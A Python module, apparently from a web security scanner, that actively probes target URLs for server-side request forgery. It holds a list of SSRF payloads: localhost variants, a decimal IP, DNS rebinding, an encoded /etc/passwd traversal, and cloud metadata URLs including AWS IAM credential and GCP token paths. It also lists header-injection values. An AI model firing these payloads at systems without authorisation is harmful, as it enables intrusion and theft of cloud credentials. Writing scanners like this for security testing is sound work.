"""SSRF active probe."""

import re
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache
from src.recon.common import normalize_url

from ._confidence import probe_confidence, probe_severity
from ._patterns import CLOUD_METADATA_RE, SSRF_INTERNAL_IP_RE

_STRICT_IP_RE = re.compile(r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b")

CLOUD_METADATA_ENDPOINTS: dict[str, list[str]] = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/instance-role",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/hostname",
    ],
    "gcp": [
        "http://169.254.169.254/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/instance/",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/instance/compute",
        "http://169.254.169.254/metadata/scheduledevents",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/meta-data/eipv4",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/opc/v1/vnics/",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address",
    ],
}

METADATA_HEADERS: dict[str, dict[str, str]] = {
    "aws": {"X-aws-ec2-metadata-token": "test-token"},
    "gcp": {"Metadata-Flavor": "Google"},
    "azure": {"Metadata": "true"},
    "alibaba": {},
    "oracle": {},
    "digitalocean": {},
}

HEADER_INJECTION_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "http://127.0.0.1"},
    {"X-Rewrite-URL": "http://127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Port": "80"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Origin-IP": "127.0.0.1"},
]


def _make_header_payload(
    base_headers: dict[str, str], injection_headers: dict[str, str] | None = None
) -> dict[str, str]:
    """Merge base headers with injection headers."""
    headers = {"Cache-Control": "no-cache", "X-SSRF-Probe": "1"}
    headers.update(base_headers)
    if injection_headers:
        headers.update(injection_headers)
    return headers


def _analyze_metadata_response(body: str, provider: str) -> list[str]:
    """Check response content for cloud metadata patterns."""
    indicators = []

    if CLOUD_METADATA_RE.search(body):
        indicators.append("cloud_metadata_response")
    if SSRF_INTERNAL_IP_RE.search(body):
        indicators.append("internal_ip_response")
    if "127.0.0.1" in body or "localhost" in body.lower():
        indicators.append("localhost_response")
    if provider == "aws" and any(
        kw in body.lower() for kw in ("ami-id", "instance-id", "iam/security")
    ):
        indicators.append("aws_metadata_leak")
    if provider == "gcp" and any(
        kw in body.lower() for kw in ("instance/", "project/", "service-accounts")
    ):
        indicators.append("gcp_metadata_leak")
    if provider == "azure" and any(kw in body.lower() for kw in ("compute", "network", "vmSize")):
        indicators.append("azure_metadata_leak")
    if _STRICT_IP_RE.search(body):
        indicators.append("private_ip_range_10")

    # Removed non_error_response check - it was a guaranteed false-positive generator
    # A large body with no errors is NOT indicative of SSRF

    return indicators


def _get_all_metadata_urls() -> list[tuple[str, str, str]]:
    """Return all cloud metadata URLs as (provider, endpoint, url) tuples."""
    result = []
    for provider, endpoints in CLOUD_METADATA_ENDPOINTS.items():
        for endpoint in endpoints:
            result.append((provider, endpoint, endpoint))
    return result


def ssrf_active_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 10,
) -> list[dict[str, Any]]:
    """Test URL parameters with internal addresses for SSRF.

    Sends payloads like 127.0.0.1, localhost, 169.254.169.254 to
    URL-like parameters. Checks for internal service responses and
    cloud metadata exposure.

    Includes cloud metadata URL testing and header injection vectors.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of SSRF findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    url_param_names = {
        "url",
        "uri",
        "path",
        "dest",
        "redirect",
        "window",
        "next",
        "data",
        "reference",
        "site",
        "html",
        "val",
        "validate",
        "domain",
        "callback",
        "return",
        "page",
        "feed",
        "port",
        "view",
        "dir",
        "show",
        "navigation",
        "open",
        "target",
        "link",
        "href",
        "src",
        "source",
        "file",
        "load",
        "proxy",
        "fetch",
        "remote",
        "access",
        "to",
        "from",
        "server",
        "host",
        "endpoint",
        "api",
    }

    ssrf_payloads = [
        ("localhost", "http://127.0.0.1"),
        ("localhost_alt", "http://localhost"),
        ("zero_ip", "http://0.0.0.0"),
        ("cloud_metadata_aws", "http://169.254.169.254/latest/meta-data/"),
        ("cloud_metadata_gcp", "http://metadata.google.internal/computeMetadata/v1/"),
        ("ipv6_localhost", "http://[::1]"),
        ("localhost_port_8080", "http://127.0.0.1:8080"),
        ("encoded_localhost", "http://127.0.0.1%2f..%2f..%2fetc%2fpasswd"),
        ("decimal_ip", "http://2130706433"),
        ("dns_rebind", "http://localtest.me"),
    ]

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "")).strip()
        if not url:
            continue

        parsed = urlparse(url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not query_pairs:
            continue

        url_params = [
            (i, k, v) for i, (k, v) in enumerate(query_pairs) if k.lower() in url_param_names
        ]
        if not url_params:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for idx, param_name, _param_value in url_params:
            if len(url_probes) >= 2:
                break
            for payload_name, payload_value in ssrf_payloads:
                updated = list(query_pairs)
                updated[idx] = (param_name, payload_value)
                test_url = normalize_url(
                    urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                )

                response = response_cache.request(
                    test_url,
                    headers={
                        "Cache-Control": "no-cache",
                        "X-SSRF-Probe": "1",
                    },
                )
                if not response:
                    continue

                body = str(response.get("body_text", "") or "")[:8000]
                status = int(response.get("status_code") or 0)

                issues_for_hit: list[str] = []

                if CLOUD_METADATA_RE.search(body):
                    issues_for_hit.append("ssrf_cloud_metadata")
                elif SSRF_INTERNAL_IP_RE.search(body):
                    issues_for_hit.append("ssrf_internal_ip_response")
                elif "127.0.0.1" in body or "localhost" in body.lower():
                    issues_for_hit.append("ssrf_localhost_access")

                if issues_for_hit:
                    url_issues.extend(issues_for_hit)
                    url_probes.append(
                        {
                            "parameter": param_name,
                            "payload": payload_value,
                            "payload_type": payload_name,
                            "status_code": status,
                            "issues": issues_for_hit,
                        }
                    )
                    break

            if url_issues:
                for provider, header_name in [
                    ("gcp", "Metadata-Flavor"),
                    ("aws", "X-aws-ec2-metadata-token"),
                ]:
                    for payload_name, payload_value in [
                        (
                            f"cloud_metadata_{provider}",
                            CLOUD_METADATA_ENDPOINTS.get(provider, [""])[0],
                        ),
                    ]:
                        if not payload_value:
                            continue
                        updated = list(query_pairs)
                        updated[idx] = (param_name, payload_value)
                        test_url = normalize_url(
                            urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                        )
                        response = response_cache.request(
                            test_url,
                            headers={
                                "Cache-Control": "no-cache",
                                "X-SSRF-Probe": "1",
                                header_name: "true"
                                if provider == "azure"
                                else "Google"
                                if provider == "gcp"
                                else "test-token",
                            },
                        )
                        if response:
                            body = str(response.get("body_text", "") or "")[:8000]
                            status = int(response.get("status_code") or 0)
                            metadata_indicators = _analyze_metadata_response(body, provider)
                            if any("leak" in ind for ind in metadata_indicators):
                                url_issues.append(
                                    f"ssrf_{provider}_metadata_{header_name}_injection"
                                )
                                url_probes.append(
                                    {
                                        "parameter": param_name,
                                        "payload": payload_value,
                                        "payload_type": f"cloud_metadata_{provider}_with_header",
                                        "header": {
                                            header_name: "true"
                                            if provider == "azure"
                                            else "Google"
                                            if provider == "gcp"
                                            else "test-token"
                                        },
                                        "status_code": status,
                                        "issues": metadata_indicators,
                                    }
                                )

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
